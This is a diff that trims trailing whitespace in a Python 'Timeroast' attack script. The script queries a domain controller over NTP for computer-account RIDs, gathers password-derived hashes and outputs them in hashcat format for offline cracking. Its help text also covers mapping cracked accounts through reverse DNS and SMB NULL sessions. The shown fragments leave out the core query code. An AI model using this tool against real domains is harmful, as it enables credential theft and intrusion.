@@ -25,10 +25,10 @@ def hashcat_format(rid : int, hashval : bytes, salt : bytes) -> str:
 def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float, old_pwd : bool, src_port : int = 0) -> List[Tuple[int, bytes, bytes]]:
   """Gathers MD5(MD4(password) || NTP-response[:48]) hashes for a sequence of RIDs.
      Rate is the number of queries per second to send.
-     Will quit when either rids ends or no response has been received in giveup_time seconds. Note that the server will 
-     not respond to queries with non-existing RIDs, so it is difficult to distinguish nonexistent RIDs from network 
+     Will quit when either rids ends or no response has been received in giveup_time seconds. Note that the server will
+     not respond to queries with non-existing RIDs, so it is difficult to distinguish nonexistent RIDs from network
      issues.
-     
+
      Yields (rid, hash, salt) pairs, where salt is the NTP response data."""
 
   # Flag in key identifier that indicates whether the old or new password should be used.
@@ -47,7 +47,7 @@ def ntp_roast(dc_host : str, rids : Iterable, rate : int, giveup_time : float, o
     rid_iterator = iter(rids)
 
     while time() < last_ok_time + giveup_time:
-      
+
       # Send out query for the next RID, if any.
       query_rid = next(rid_iterator, None)
       if query_rid is not None:
@@ -75,10 +75,10 @@ def get_args():
   """Parse command-line arguments."""
 
   argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
-"""Performs an NTP 'Timeroast' attack against a domain controller. 
+"""Performs an NTP 'Timeroast' attack against a domain controller.
 Outputs the resulting hashes in the hashcat format 31300 with the --username flag ("<RID>:$sntp-ms$<hash>$<salt>").
 
-Usernames within the hash file are user RIDs. In order to use a cracked 
+Usernames within the hash file are user RIDs. In order to use a cracked
 password that does not contain the computer name, either look up the RID
 in AD (if you already have some account) or use a computer name list obtained
 via reverse DNS, service scanning, SMB NULL sessions etc.
@@ -109,8 +109,8 @@ listen privileges) is needed.
 
   # Configurable options.
   argparser.add_argument(
-    '-o', '--out', 
-    type=FileType('w'), default=stdout, metavar='FILE', 
+    '-o', '--out',
+    type=FileType('w'), default=stdout, metavar='FILE',
     help='Hash output file. Writes to stdout if omitted.'
   )
   argparser.add_argument(
@@ -152,12 +152,12 @@ listen privileges) is needed.
 
 def main():
   """Command-line interface."""
-  
+
   args = get_args()
   output = args.out
   for rid, hashval, salt in ntp_roast(args.dc, args.rids, args.rate, args.timeout, args.old_hashes, args.src_port):
     print(hashcat_format(rid, hashval, salt), file=output)
-  
+
 
 if __name__ == '__main__':
   main()
